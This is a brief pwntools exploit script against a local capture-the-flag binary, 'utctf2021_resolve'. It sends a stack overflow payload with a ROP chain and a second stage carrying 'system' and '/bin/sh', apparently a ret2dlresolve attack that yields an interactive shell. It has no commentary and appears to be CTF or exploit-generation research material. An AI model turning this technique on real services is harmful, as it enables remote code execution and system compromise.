from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/23_utctf2021_resolve/utctf2021_resolve")
pwn.gdb.attach(p)
payload = b"\x00" * 16
payload += p64(0x40101a) + p64(0x4011c3) + p64(0x404e00) + p64(0x401040) + p64(0x4011c3) + p64(0x404e50) + p64(0x401020) + p64(0x310)
payload += b"\n"
p.send(payload)
payload = b""
payload += b'system\x00acaaadaaaeaaafaaa\xe0I\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00maaanaaa\x00N@\x00\x00\x00\x00\x00\x07\x00\x00\x00\x19\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/bin/sh\x00'
payload += b"\n"
p.send(payload)
p.interactive()
